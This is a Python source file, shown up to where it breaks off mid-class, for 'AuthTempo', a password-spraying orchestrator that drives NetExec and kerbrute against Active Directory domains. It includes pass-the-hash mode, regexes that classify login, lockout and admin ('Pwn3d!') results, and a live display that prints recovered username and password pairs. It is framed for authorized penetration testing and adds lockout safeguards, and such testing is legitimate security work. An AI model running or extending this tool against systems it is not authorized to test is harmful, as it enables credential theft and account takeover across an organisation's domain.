#!/usr/bin/env python3
"""
AuthTempo — safety-first password-spray orchestrator

For authorized penetration testing only. Wraps nxc (NetExec) and kerbrute
with preflight checks, failover between engines, lockout safety,
live rich UI, and state persistence for resumable sprays.

Dependencies:
    pip install rich

External tools (must be installed and on PATH, or override with --*-path):
    - nxc / netexec (https://github.com/Pennyw0rth/NetExec)
    - kerbrute (https://github.com/ropnop/kerbrute)
"""

import argparse
import csv
import datetime
import enum
import hashlib
import html
import io
import json
import math
import os
import queue
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Dict, Set, Optional, Tuple, Any

try:
    import fcntl
except ImportError:  # pragma: no cover - AuthTempo currently targets Unix-like hosts.
    fcntl = None

# Rich library for live terminal UI
try:
    from rich.console import Console, Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.layout import Layout
    from rich.markup import escape
    from rich.align import Align
    from rich import box
except ImportError:
    print("[!] rich library not installed. Run: pip install rich", file=sys.stderr)
    sys.exit(1)

PRODUCT_NAME = "AuthTempo"
PRODUCT_SLUG = "authtempo"
PRODUCT_TAGLINE = "controlled authentication testing with enforced safety limits"
STATE_FILE_NAME = f"{PRODUCT_SLUG}.state.json"
AUDIT_LOG_NAME = f"{PRODUCT_SLUG}.log"
TIMELINE_HTML_NAME = f"{PRODUCT_SLUG}-timeline.html"
PASSWORD_CHANGES_FILE_NAME = "password-change-required.txt"

# =============================================================================
# Dataclasses
# =============================================================================

@dataclass
class Config:
    """Run configuration from CLI args."""
    userfile: str
    passfile: str
    domain: str
    dc_ip: str
    tool: str = "kerbrute"
    protocol: str = "ldap"
    time_between_rounds: int = 35
    passwords_per_round: int = 1
    pth_mode: bool = False
    lockout_threshold: int = 2
    # Maximum lockout signals allowed in one secret/pass. The next signal is
    # an unconditional hard stop. The legacy CLI name is --lockout-burst.
    lockout_burst: int = 3
    conn_fail_limit: int = 10
    nxc_path: Optional[str] = None
    kerbrute_path: Optional[str] = None
    resume: bool = False
    start_fresh: bool = False
    dry_run: bool = False
    no_preflight: bool = False
    log_dir: str = "./authtempo-out"
    filter_disabled: bool = False
    export: str = "none"
    schedule: str = ""
    timeline: bool = False
    feed_lines: int = 10  # Recent raw-output lines shown in the compact dashboard.
    engine_cooldown_rounds: int = 3
    engine_transient_threshold: int = 2
    realm_retry: bool = True
    verbose: bool = False
    live_ui: bool = True
    force_live_ui: bool = False
    retry_compromised: bool = False
    retry_indeterminate: bool = False
    engine_timeout_seconds: int = 300
    engine_idle_timeout_seconds: int = 60
    probe_demoted: bool = False
    # Derived fields
    users: List[str] = field(default_factory=list)
    source_users: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    nxc_binary: str = ""
    kerbrute_binary: str = ""
    realm_candidates: List[str] = field(default_factory=list)

@dataclass
class Engine:
    """Tool/protocol combination for failover chain."""
    tool: str  # "nxc" or "kerbrute"
    protocol: Optional[str] = None  # "smb" or "ldap" for nxc, None for kerbrute

    def __str__(self) -> str:
        if self.tool == "kerbrute":
            return "kerbrute"
        return f"nxc:{self.protocol}"

@dataclass
class RoundResult:
    """Results from spraying one password/hash with one engine."""
    successes: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret)
    admin_users: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret) - admin/pwn3d
    password_change_required: List[Tuple[str, str, str]] = field(default_factory=list)
    lockouts: Set[str] = field(default_factory=set)
    unknown_lockouts: int = 0
    conn_fails: int = 0
    errors: List[str] = field(default_factory=list)  # Tool-level errors (wrong realm, etc.)
    aborted: bool = False
    abort_reason: str = ""
    clean_finish: bool = False
    reconciled_complete: bool = False
    terminal_users: Set[str] = field(default_factory=set)
    indeterminate_users: Set[str] = field(default_factory=set)
    ambiguous_lockouts: Set[str] = field(default_factory=set)
    unknown_ambiguous_lockouts: int = 0
    summary_tested: Optional[int] = None
    dispatches: int = 0

    @property
    def lockout_count(self) -> int:
        """Number of distinct known users plus unidentifiable lockout signals."""
        return (
            len(self.lockouts)
            + self.unknown_lockouts
            + len(self.ambiguous_lockouts)
            + self.unknown_ambiguous_lockouts
        )

# =============================================================================
# Classification pattern constants (version-agnostic, extensible)
# =============================================================================

class LineType(enum.Enum):
    SUCCESS = "SUCCESS"
    ADMIN = "ADMIN"  # Admin/high-privilege user (pwn3d!)
    PASSWORD_EXPIRED = "PASSWORD_EXPIRED"
    PASSWORD_MUST_CHANGE = "PASSWORD_MUST_CHANGE"
    LOCKOUT = "LOCKOUT"
    AMBIGUOUS_LOCKOUT = "AMBIGUOUS_LOCKOUT"
    CONN_ERROR = "CONN_ERROR"
    AUTHFAIL = "AUTHFAIL"
    ERROR = "ERROR"  # Tool-level error (wrong realm, domain mismatch, etc.)
    SUMMARY = "SUMMARY"
    INFO = "INFO"

# nxc / netexec patterns
NXC_SUCCESS_PATTERNS = [r"\[\+\]"]  # netexec marks success with [+]

# Admin/pwn3d patterns - check AFTER success since pwn3d appears on success lines
NXC_ADMIN_PATTERNS = [
    r"\(Pwn3d!\)",
    r"\[ADMIN\]",
]

NXC_LOCKOUT_PATTERNS = [
    r"USER_ACCOUNT_LOCKED",
    r"LOCKED_OUT",
    r"account locked out",
    r"STATUS_ACCOUNT_LOCKED_OUT",
    r"\bdata\s+775\b",
    r"\b0xC0000234\b",
    r"locked out",
]
NXC_AMBIGUOUS_LOCKOUT_PATTERNS = [
    r"KDC_ERR_CLIENT_REVOKED",
]
NXC_CONN_ERROR_PATTERNS = [
    r"timed out",
    r"NetBIOS",
    r"connection (?:reset|aborted|closed|failed|error)",
    r"unreachable",
    r"Failed to connect",
    r"Could not connect",
    r"SocketServer",
    r"Connection refused",
    r"Network unreachable",
    r"Host is down",
]
NXC_AUTHFAIL_PATTERNS = [
    r"STATUS_LOGON_FAILURE",
    r"STATUS_NO_SUCH_USER",
    r"\[-\].*Status:",
    r"\[-\].*\\[^:\s]+:\S+",
]

# kerbrute patterns
KERBRUTE_SUCCESS_PATTERNS = [r"\[\+\] VALID LOGIN(?: WITH ERROR)?:"]

# kerbrute error patterns (detect domain/realm issues)
KERBRUTE_ERROR_PATTERNS = [
    r"KDC error.*wrong realm",
    r"wrong realm",
    r"try adjusting domain",
    r"realm mismatch",
    r"cannot find KDC",
    r"no KDC found",
    r"cannot resolve",
    r"unknown realm",
]

KERBRUTE_LOCKOUT_PATTERNS = [
    r"account locked",
    r"locked out",
]
KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS = [r"KDC_ERR_CLIENT_REVOKED"]
KERBRUTE_CONN_ERROR_PATTERNS = [
    r"NETWORK ERROR",
    r"Can't talk to KDC",
    r"cannot talk to KDC",
    r"i/o timeout",
    r"deadline exceeded",
    r"connection refused",
    r"no such host",
    r"network unreachable",
]
KERBRUTE_AUTHFAIL_PATTERNS = [
    r"KDC_ERR_PREAUTH_FAILED",
    r"KDC_ERR_PREAUTH_REQUIRED",
    r"KRB_AP_ERR_SKEW",
    r"KDC_ERR_C_PRINCIPAL_UNKNOWN",
]

PASSWORD_EXPIRED_PATTERNS = [
    r"\bSTATUS_PASSWORD_EXPIRED\b",
    r"\bKDC_ERR_KEY_EXPIRED\b",
]
PASSWORD_MUST_CHANGE_PATTERNS = [
    r"\bSTATUS_PASSWORD_MUST_CHANGE\b",
]

NXC_FATAL_ERROR_PATTERNS = [
    r"Exception while calling proto_flow",
    r"Traceback \(most recent call last\)",
    r"Unhandled exception",
]

STATE_SCHEMA_VERSION = 7
QUARANTINE_PRIORITY = {
    "confirmed_lockout": 0,
    "ambiguous_lockout_signal": 1,
    "credential_found": 2,
    "indeterminate": 3,
    "unknown": 99,
}
PASSWORD_CHANGE_PAIR_STATUSES = {
    "password_expired",
    "password_must_change",
}
SUCCESS_PAIR_STATUSES = {
    "success",
    "admin_success",
    *PASSWORD_CHANGE_PAIR_STATUSES,
}
CREDENTIAL_STATES = {"valid", *PASSWORD_CHANGE_PAIR_STATUSES}
TERMINAL_PAIR_STATUSES = {
    "auth_failure",
    *SUCCESS_PAIR_STATUSES,
    "lockout",
    "ambiguous_lockout",
    "indeterminate",
    "dry_run",
    "legacy_attempted",
}
NO_AUTH_ABORT_REASONS = {
    "wrong-realm",
    "binary-not-found",
    "command-not-found",
    "invalid-protocol",
    "pth-kerbrute-incompatible",
    "unknown-engine",
}

ANSI_ESCAPE_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")


def canonical_identity(user: str, domain: str = "") -> str:
    """Return a stable AD identity key while preserving the source value elsewhere."""
    value = str(user).strip()
    configured_domain = domain.casefold().rstrip(".")
    configured_short = configured_domain.split(".", 1)[0] if configured_domain else ""

    if "\\" in value:
        prefix, short = value.rsplit("\\", 1)
        if not configured_domain or prefix.casefold() in {configured_domain, configured_short}:
            value = short
    elif "@" in value:
        short, realm = value.rsplit("@", 1)
        realm_key = realm.casefold().rstrip(".")
        if not configured_domain or realm_key in {configured_domain, configured_short}:
            value = short

    return value.casefold()


def unqualified_identity(user: str, domain: str = "") -> str:
    """Return an AD username without a configured-domain qualifier."""
    value = str(user).strip()
    configured_domain = domain.casefold().rstrip(".")
    configured_short = configured_domain.split(".", 1)[0] if configured_domain else ""
    if "\\" in value:
        qualifier, short = value.rsplit("\\", 1)
        if not configured_domain or qualifier.casefold() in {
            configured_domain,
            configured_short,
        }:
            return short
    if "@" in value:
        short, qualifier = value.rsplit("@", 1)
        if not configured_domain or qualifier.casefold().rstrip(".") in {
            configured_domain,
            configured_short,
        }:
            return short
    return value


def build_password_change_command(
    domain: str,
    user: str,
    dc_ip: str,
    *,
    secret: str = "",
    pth_mode: bool = False,
) -> str:
    """Build the installed Impacket self-service password-change command."""
    target = f"{domain}/{unqualified_identity(user, domain)}@{dc_ip}"
    command = ["impacket-changepasswd", "-protocol", "smb-samr"]
    if pth_mode:
        command.extend(["-hashes", secret])
    command.append(target)
    return shlex.join(command)


def credential_state_label(state: str) -> str:
    """Return an operator-facing description for a credential state."""
    return {
        "valid": "ready to use",
        "password_expired": "password expired",
        "password_must_change": "password must be changed",
    }.get(state, state.replace("_", " "))


def humanize_tool_issue(reason: str) -> str:
    """Translate internal engine failure codes for operator output."""
    return {
        "command-not-found": "tool command was not found",
        "binary-not-found": "tool binary was not found",
        "idle-timeout": "tool stopped producing output",
        "total-timeout": "tool exceeded its time limit",
        "connection-errors": "network connection failed",
        "unreconciled-output": "tool output could not be verified",
    }.get(reason, reason.replace("-", " ") or "unknown issue")


def _identity_aliases(user: str, domain: str) -> Set[str]:
    """Aliases that may be emitted for one configured-domain identity."""
    aliases = {str(user).strip().casefold(), canonical_identity(user, domain)}
    value = str(user).strip()
    configured_domain = domain.casefold().rstrip(".")
    configured_short = configured_domain.split(".", 1)[0] if configured_domain else ""
    if "\\" in value:
        qualifier, short = value.rsplit("\\", 1)
        if not configured_domain or qualifier.casefold() in {configured_domain, configured_short}:
            aliases.add(short.casefold())
    if "@" in value:
        short, qualifier = value.rsplit("@", 1)
        if not configured_domain or qualifier.casefold().rstrip(".") in {
            configured_domain,
            configured_short,
        }:
            aliases.add(short.casefold())
    return aliases


def _sha256_json(value: Any) -> str:
    payload = json.dumps(value, ensure_ascii=False, separators=(",", ":"), sort_keys=True)
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def _reject_duplicate_json_keys(pairs: List[Tuple[str, Any]]) -> Dict[str, Any]:
    """Build a JSON object while rejecting ambiguous duplicate keys."""
    result: Dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise ValueError(f"duplicate JSON object key: {key!r}")
        result[key] = value
    return result


def _reject_nonfinite_json_constant(value: str) -> None:
    """Reject Python's permissive NaN/Infinity JSON extensions."""
    raise ValueError(f"non-finite JSON number is not allowed: {value}")

# =============================================================================
# Password pattern classification (for pattern learning)
# =============================================================================

def classify_password_pattern(pw: str) -> str:
    """
    Classify a password into a pattern category for learning.
    Returns the pattern name (first match wins).
    """
    # Extract organization tokens from domain for org-based patterns
    # This is a simple heuristic; real implementation would use cfg.domain
    org_keywords = ["corp", "company", "org", "admin", "team", "office"]

    # welcome_year: Welcome2026!, Winter2025!
    if re.match(r"^Welcome.*\d{4}", pw, re.IGNORECASE):
        return "welcome_year"

    # seasonal_year: Summer2026!, January2025!
    seasonal = ["Summer", "Winter", "Spring", "Fall", "Autumn",
                "January", "February", "March", "April", "May", "June",
                "July", "August", "September", "October", "November", "December"]
    if any(pw.startswith(month) for month in seasonal):
        if re.search(r"\d{4}", pw):
            return "seasonal_year"

    # org_year: Contains org keyword + 4-digit year
    if any(kw in pw.lower() for kw in org_keywords) and re.search(r"\d{4}", pw):
        return "org_year"

    # ilove_org: IloveCompany123!, ILovePassword2026!
    if re.match(r"^(Ilove|ILove)", pw, re.IGNORECASE):
        return "ilove_org"

    # password_num: Password123!, P@ssw0rd2026!
    if re.match(r"^(Password|P@ssw0rd).*\d", pw, re.IGNORECASE):
        return "password_num"

    # corporate: Welcome123!, Changeme!
    if re.match(r"^(Welcome|Change|Changeme|Corporate|Company|Office)", pw, re.IGNORECASE):
        return "corporate"

    # year_only: 2026!, 2024
    if re.match(r"^\d{4}!?$", pw):
        return "year_only"

    # Default
    return "generic"

# =============================================================================
# RichUI: Live terminal panels
# =============================================================================

class RichUI:
    """Manages rich live UI: raw feed panel, summary panel, countdown."""

    def __init__(
        self,
        console: Console,
        max_feed_lines: int = 10,
        live_ui: bool = True,
        force_live: bool = False,
    ):
        self.console = console
        self.live: Optional[Live] = None
        self.raw_feed: List[str] = []
        self.max_feed_lines = max_feed_lines
        self.current_phase = "idle"  # idle, spray, countdown, stopped
        self.phase_data: Dict[str, Any] = {}
        self.current_round: Optional[int] = None

        # These persist across engine failovers and password attempts. The old
        # UI kept only the current child process's values, which made the round
        # headline lose hits whenever another engine was tried.
        self.round_successes: List[Tuple[str, str]] = []
        self._round_success_set: Set[Tuple[str, str]] = set()
        self.round_admins: Set[Tuple[str, str]] = set()
        self.round_password_changes: Dict[Tuple[str, str], str] = {}
        self.round_lockouts: Set[str] = set()
        self.round_unknown_lockouts = 0
        self.round_signal_events = 0
        self.run_successes: List[Tuple[str, str]] = []
        self._run_success_set: Set[Tuple[str, str]] = set()
        self.run_admins: Set[Tuple[str, str]] = set()
        self.run_password_changes: Dict[Tuple[str, str], str] = {}
        self.run_lockouts: Set[str] = set()
        self.run_unknown_lockouts = 0
        self.run_signal_events = 0

        # Redirected output and TERM=dumb cannot reliably support cursor-based
        # Live rendering. In that case (or after a rendering exception), keep
        # the spray running and stream the raw tool output instead.
        term = os.environ.get("TERM", "")
        self._tmux_auto_fallback = bool(
            os.environ.get("TMUX") and live_ui and not force_live
        )
        self.live_enabled = bool(
            live_ui
            and console.is_terminal
            and term != "dumb"
            and not self._tmux_auto_fallback
        )
        self._stream_fallback = not self.live_enabled
        self._live_warning_shown = False

    def load_totals(
        self,
        credentials: List[Tuple[str, str]],
        admin_credentials: Set[Tuple[str, str]],
        locked_users: Set[str],
        unknown_lockouts: int = 0,
        signal_events: Optional[int] = None,
        credential_states: Optional[Dict[Tuple[str, str], str]] = None,
    ) -> None:
        """Seed run-wide UI totals from persisted state (including resumes)."""
        self.run_successes = list(dict.fromkeys(credentials))
        self._run_success_set = set(self.run_successes)
        self.run_admins = set(admin_credentials)
        self.run_password_changes = {
            pair: state
            for pair, state in (credential_states or {}).items()
            if state in PASSWORD_CHANGE_PAIR_STATUSES
        }
        self.run_lockouts = set(locked_users)
        self.run_unknown_lockouts = unknown_lockouts
        self.run_signal_events = (
            signal_events
            if signal_events is not None
            else len(self.run_lockouts) + unknown_lockouts
        )

    def start_spray(self, engine: Engine, secret: str, round_num: int, batch_info: str = ""):
        """Initialize the Live display for spray phase."""
        # Defensive cleanup also prevents Rich's "only one live display" error
        # after an engine exception or failover.
        self.end_spray()

        if self.current_round != round_num:
            self.current_round = round_num
            self.round_successes = []
            self._round_success_set = set()
            self.round_admins = set()
            self.round_password_changes = {}
            self.round_lockouts = set()
            self.round_unknown_lockouts = 0
            self.round_signal_events = 0

        self.current_phase = "spray"
        self.phase_data = {
            "engine": str(engine),
            "secret": secret,
            "batch_info": batch_info,
            "batch": round_num,
            "successes": [],
            "success_set": set(),
            "admin_users": set(),  # Track admin/pwn3d users separately for highlighting
            "lockouts": set(),
            "unknown_lockouts": 0,
            "errors": [],  # Track tool errors
            "conn_fails": 0,
        }
        self.raw_feed = []
        if not self.live_enabled:
            if self._tmux_auto_fallback and not self._live_warning_shown:
                self._live_warning_shown = True
                self.console.print(
                    "[*] tmux detected: using stable streaming display. "
                    "Use --dashboard to force the cursor-based dashboard.",
                    style="cyan",
                )
            self.console.print(
                f"[*] Batch {round_num} | {engine} | "
                f"credentials {len(self.run_successes)} | "
                f"safety signals {self.run_signal_events}",
                style="dim",
            )
            for found_user, found_secret in self.run_successes[-3:]:
                marker = "ADMIN" if (found_user, found_secret) in self.run_admins else "CREDENTIAL"
                self.console.print(
                    f"[+] {marker}: {escape(str(found_user))}:"
                    f"{escape(str(found_secret))}",
                    style="red bold" if marker == "ADMIN" else "green bold",
                )
            return

        if self.console.height < 12 or self.console.width < 60:
            self.live_enabled = False
            self._stream_fallback = True
            if not self._live_warning_shown:
                self._live_warning_shown = True
                self.console.print(
                    "[!] Terminal pane is too small for the Live dashboard; "
                    "streaming raw output instead (minimum 60x12).",
                    style="yellow",
                )
            return

        try:
            # A lower refresh rate is much less prone to flicker and partial
            # frames inside tmux, especially over SSH.
            refresh_rate = 4 if os.environ.get("TMUX") else 10
            self.live = Live(
                self._render_spray(),
                console=self.console,
                refresh_per_second=refresh_rate,
                vertical_overflow="crop",
                redirect_stdout=True,
                redirect_stderr=True,
            )
            self.live.start(refresh=True)
        except Exception as exc:
            self._disable_live(exc)

    def feed_line(self, line: str):
        """Append a raw line to the feed (scrolling)."""
        if len(self.raw_feed) >= self.max_feed_lines:
            self.raw_feed.pop(0)
        self.raw_feed.append(line)
        if self.live:
            self._update_display()
        elif self._stream_fallback:
            self.console.print(Text(line))

    def update_success(self, user: str, secret: str):
        """Register a credential hit."""
        is_new = (user, secret) not in self._run_success_set
        self._record_success(user, secret, is_admin=False)
        if self._stream_fallback and is_new:
            self.console.print(
                f"[+] CREDENTIAL: {escape(str(user))}:{escape(str(secret))}",
                style="green bold",
            )
        self._update_display()

    def update_admin(self, user: str, secret: str):
        """Register an admin credential hit (pwn3d!)."""
        is_new = (user, secret) not in self._run_success_set
        self._record_success(user, secret, is_admin=True)
        if self._stream_fallback and is_new:
            self.console.print(
                f"[+] ADMIN CREDENTIAL: {escape(str(user))}:{escape(str(secret))}",
                style="red bold",
            )
        self._update_display()

    def update_password_change(
        self,
        user: str,
        secret: str,
        credential_state: str,
        command: str,
    ) -> None:
        """Register and prominently display a valid credential needing a change."""
        is_new = (user, secret) not in self._run_success_set
        self._record_success(user, secret, is_admin=False)
        pair = (user, secret)
        self.round_password_changes[pair] = credential_state
        self.run_password_changes[pair] = credential_state
        if self._stream_fallback and is_new:
            self.console.print(
                f"[!] VALID CREDENTIAL — {credential_state_label(credential_state).upper()}",
                style="magenta bold",
            )
            self.console.print(
                f"    {escape(str(user))}:{escape(str(secret))}",
                style="magenta bold",
            )
            self.console.print(
                f"    Change it: {escape(command)}",
                style="magenta",
            )
        self._update_display()

    def _record_success(self, user: str, secret: str, is_admin: bool) -> None:
        pair = (user, secret)
        if pair not in self.phase_data["success_set"]:
            self.phase_data["success_set"].add(pair)
            self.phase_data["successes"].append(pair)
        if pair not in self._round_success_set:
            self._round_success_set.add(pair)
            self.round_successes.append(pair)
        if pair not in self._run_success_set:
            self._run_success_set.add(pair)
            self.run_successes.append(pair)
        if is_admin:
            self.phase_data["admin_users"].add(pair)
            self.round_admins.add(pair)
            self.run_admins.add(pair)

    def update_lockout(self, user: Optional[str]):
        """Register a lockout."""
        self.round_signal_events += 1
        self.run_signal_events += 1
        if user:
            self.phase_data["lockouts"].add(user)
            self.round_lockouts.add(user)
            self.run_lockouts.add(user)
        else:
            self.phase_data["unknown_lockouts"] += 1
            self.round_unknown_lockouts += 1
            self.run_unknown_lockouts += 1
        self._update_display()

    def update_error(self, error_msg: str):
        """Register a tool error."""
        self.phase_data["errors"].append(error_msg)
        self._update_display()

    def increment_conn_fails(self):
        """Register a connection failure."""
        self.phase_data["conn_fails"] += 1
        self._update_display()

    def set_abort(self, reason: str):
        """Show abort reason in summary."""
        self.phase_data["abort_reason"] = reason
        self._update_display()

    def _update_display(self):
        """Refresh the Live display."""
        if self.live and self.current_phase == "spray":
            try:
                self.live.update(self._render_spray(), refresh=True)
            except Exception as exc:
                self._disable_live(exc)

    def _disable_live(self, exc: Exception) -> None:
        """Degrade a terminal-rendering failure to safe line-by-line output."""
        active_live = self.live
        self.live = None
        self.live_enabled = False
        self._stream_fallback = True
        if active_live:
            try:
                active_live.stop()
            except Exception:
                pass
        if not self._live_warning_shown:
            self._live_warning_shown = True
            self.console.print(
                f"[!] Live display unavailable ({escape(type(exc).__name__)}); "
                "streaming raw output instead. Use --stream to select this mode explicitly.",
                style="yellow",
            )

    def _summary_height(self) -> int:
        """Estimate compact summary height when limiting the raw feed."""
        terminal_height = max(int(getattr(self.console, "height", 24) or 24), 8)
        detail_rows = min(2, len(self.run_successes)) + min(1, len(self.round_lockouts))
        error_rows = min(2, len(self.phase_data.get("errors", [])))
        desired = 5 + detail_rows + error_rows
        return max(5, min(desired, terminal_height - 5))

    def _feed_row_limit(self) -> int:
        """Return the number of recent raw lines that fit without taking the screen."""
        terminal_height = max(int(getattr(self.console, "height", 24) or 24), 8)
        available = max(1, terminal_height - self._summary_height() - 6)
        return min(self.max_feed_lines, available)

    def _render_spray(self) -> Panel:
        """Render a content-sized spray dashboard instead of a full-screen layout."""
        summary = self._build_summary()
        feed = self._build_feed()
        recent_output = Panel(
            feed,
            title=(
                "Recent tool output — newest first "
                f"(up to {self._feed_row_limit()} lines)"
            ),
            border_style="dim",
            box=box.SQUARE,
        )
        return Panel(
            Group(summary, recent_output),
            title=(
                f"[bold]{PRODUCT_NAME} — Batch "
                f"{self.phase_data.get('batch', '?')}[/bold]"
            ),
            border_style="blue",
        )

    def _build_summary(self) -> Panel:
        """Build the summary panel."""
        engine = self.phase_data.get("engine", "N/A")
        secret = self.phase_data.get("secret", "***")
        errors = self.phase_data.get("errors", [])
        conn_fails = self.phase_data.get("conn_fails", 0)
        abort_reason = self.phase_data.get("abort_reason", "")

        grid = Table.grid(expand=True)
        grid.add_column()
        grid.add_column(justify="right")

        # Credentials stay at the top and persist across engine failovers. Show
        # the actual pair so an operator never has to recover it from raw logs.
        grid.add_row(
            "[green bold]Credentials (batch / total):",
            f"[green bold]{len(self.round_successes)} / {len(self.run_successes)}[/green bold]",
        )
        for user, found_secret in self.run_successes[-2:]:
            pair = (user, found_secret)
            if pair in self.run_admins:
                marker = "[red bold]★ ADMIN[/red bold]"
            elif pair in self.run_password_changes:
                marker = "[magenta bold]↻ CHANGE REQUIRED[/magenta bold]"
            else:
                marker = "[green]✓[/green]"
            grid.add_row(
                "",
                f"{marker} [white]{escape(str(user))}:{escape(str(found_secret))}[/white]",
            )

        grid.add_row(
            "[yellow]Safety / affected (batch · total):",
            (
                f"{self.round_signal_events} · {self.run_signal_events} / "
                f"{len(self.round_lockouts)} · {len(self.run_lockouts)}"
            ),
        )
        for user in sorted(self.round_lockouts)[-1:]:
            grid.add_row("", f"[yellow]! latest: [white]{escape(str(user))}")
        if self.round_unknown_lockouts:
            grid.add_row("", f"[yellow]! {self.round_unknown_lockouts} unknown user(s)[/yellow]")

        grid.add_row("[cyan]Engine / current password:", f"{escape(str(engine))} / [yellow]{escape(str(secret))}[/yellow]")

        # Show errors
        if errors:
            grid.add_row("[red bold]ERRORS:", str(len(errors)))
            for err in errors[-2:]:
                err_short = err[:60] + "..." if len(err) > 60 else err
                grid.add_row("", f"  [red]✗[white] {escape(str(err_short))}")

        if conn_fails:
            grid.add_row("[red]Connection failures:", str(conn_fails))
        if abort_reason:
            grid.add_row("[red]Aborted:", escape(str(abort_reason)))

        return Panel(grid, title="Summary", border_style="cyan")

    def _build_feed(self) -> str:
        """Build the raw feed text."""
        if not self.raw_feed:
            return "[dim]Waiting for tool output...[/dim]"
        # Keep recent lines at the top and cap the visible panel independently
        # of terminal height. The complete unabridged output remains in the log.
        lines_rev = self.raw_feed[-self._feed_row_limit():][::-1]
        # Colorize: red/bold for pwn3d/admin, green for [+] success, yellow for lockout keywords, red for error keywords
        colored = []
        for line in lines_rev:
            safe_line = escape(line)
            # Check for admin/pwn3d indicators first (highest priority)
            if any(kw in line for kw in ["(Pwn3d!)", "[ADMIN]", "Domain Admin", "Administrator"]):
                colored.append(f"[red bold]{safe_line}[/red bold]")
            elif any(
                marker in line.upper()
                for marker in (
                    "STATUS_PASSWORD_EXPIRED",
                    "STATUS_PASSWORD_MUST_CHANGE",
                    "KDC_ERR_KEY_EXPIRED",
                )
            ):
                colored.append(f"[magenta bold]{safe_line}[/magenta bold]")
            elif "[+]" in line or "VALID LOGIN" in line:
                colored.append(f"[green]{safe_line}[/green]")
            elif any(kw in line.upper() for kw in ["LOCKED", "LOCKOUT", "REVOKED"]):
                colored.append(f"[yellow]{safe_line}[/yellow]")
            elif any(kw in line for kw in ["timed out", "NetBIOS", "connection", "unreachable"]):
                colored.append(f"[red]{safe_line}[/red]")
            else:
                colored.append(f"[dim]{safe_line}[/dim]")
        return "\n".join(colored)

    def end_spray(self):
        """Stop the Live display after spray phase."""
        active_live = self.live
        self.live = None
        if active_live:
            try:
                active_live.stop()
            except Exception as exc:
                self._disable_live(exc)
        self.current_phase = "idle"

    def countdown(self, seconds: int):
        """Show MM:SS countdown between batches - simple line by line."""
        mins, secs = divmod(seconds, 60)
        if self._stream_fallback:
            self.console.print(
                f"[*] Time until next spray: {mins:02d}:{secs:02d}",
                style="cyan",
            )
            while seconds > 0:
                time.sleep(1)
                seconds -= 1
                if seconds and (seconds % 60 == 0 or seconds <= 10):
                    mins, secs = divmod(seconds, 60)
                    self.console.print(
                        f"[*] Time until next spray: {mins:02d}:{secs:02d}",
                        style="dim",
                    )
            return

        self.console.print(f"[*] Time until next spray: {mins:02d}:{secs:02d}", style="cyan", end="")

        while seconds > 0:
            mins, secs = divmod(seconds, 60)
            # Move cursor back and update
            print(f"\r[*] Time until next spray: {mins:02d}:{secs:02d}  ", end="", flush=True)
            time.sleep(1)
            seconds -= 1

        print()  # New line after countdown

    def _render_countdown(self) -> Panel:
        """Render countdown panel (deprecated - now using simple line countdown)."""
        # This function is no longer used but kept for compatibility
        remaining = self.phase_data.get("countdown_remaining", 0)
        mins, secs = divmod(remaining, 60)
        countdown_str = f"{mins:02d}:{secs:02d}"

        layout = Layout()
        layout.split_column(
            Layout(self._build_summary()),
            Layout(Align.center(Text(f"  Time until next spray: {countdown_str}  ")))
        )
        return Panel(layout, title=f"[bold]{PRODUCT_NAME} — Waiting[/bold]", border_style="blue")

    def alert(self, title: str, message: str, style: str = "yellow"):
        """Show a non-modal alert (use for hard-stops, preflight failures)."""
        self.console.print(Panel(message, title=title, border_style=style))
        self.console.print()

# =============================================================================
# State: Resume and persistence
# =============================================================================

class State:
    """Load/save run state for resumability."""

    def __init__(self, log_dir: str, cfg: Config):
        if not cfg.source_users:
            cfg.source_users = list(cfg.users)
        for user in cfg.users:
            if not user or any(ord(char) < 32 for char in user):
                raise ValueError("configured identities cannot be empty or contain control characters")
        for secret in cfg.passwords:
            if secret == "" or any(
                ord(char) < 32 and char != "\t"
                for char in secret
            ):
                raise ValueError(
                    "configured secrets cannot be empty or contain line/control characters"
                )
        if len({canonical_identity(user, cfg.domain) for user in cfg.users}) != len(cfg.users):
            raise ValueError("configured identities contain canonical duplicates")
        if len(set(cfg.passwords)) != len(cfg.passwords):
            raise ValueError("configured secrets contain exact duplicates")
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
        os.chmod(self.log_dir, 0o700)
        self.cfg = cfg

        self._lock_handle = None
        self._acquire_run_lock()

        self.state_file = self.log_dir / STATE_FILE_NAME
        self.overall_log = self.log_dir / AUDIT_LOG_NAME
        self.creds_file = self.log_dir / "creds.txt"
        self.password_changes_file = self.log_dir / PASSWORD_CHANGES_FILE_NAME
        self.lockouts_file = self.log_dir / "locked-out.txt"
        self.used_file = self.log_dir / "used-passwords.txt"

        # Runtime state
        self.used_passwords: List[str] = []
        self.remaining_queue: List[str] = []
        # `found_creds` remains for state-file compatibility. `credentials`
        # is the authoritative pair-level history so two working passwords for
        # one user are not collapsed into a single success.
        self.found_creds: Dict[str, str] = {}
        self.credentials: List[Dict[str, Any]] = []
        self._credential_index: Dict[Tuple[str, str], Dict[str, Any]] = {}
        self.locked_users: Set[str] = set()
        self.quarantined_users: Dict[str, Dict[str, Any]] = {}
        self.lockout_signals: List[Dict[str, Any]] = []
        self.unknown_lockout_events: int = 0
        self.acknowledged_lockouts: int = 0
        self.completed_rounds = 0
        self.last_batch_completed_at: Optional[str] = None
        self.current_round: int = 0
        self.current_pass: int = 0

        # Feature 1: Credential-reuse matrix (password -> set of users attempted)
        self.attempted_matrix: Dict[str, Set[str]] = {}
        self.pair_ledger: Dict[str, Dict[str, Dict[str, Any]]] = {}

        # Feature 3: Pattern learning (pattern -> success count)
        self.success_by_pattern: Dict[str, int] = {}

        # Feature 5: Admin users tracking (for CSV export)
        self.admin_users: Dict[str, str] = {}  # user -> password

        # Feature 4: Spray statistics
        self.start_time: str = datetime.datetime.now().isoformat()
        self.total_attempts: int = 0
        self.total_dispatches: int = 0
        self.attempts_by_password: Dict[str, int] = {}

        # Temp file counter for userlist filtering
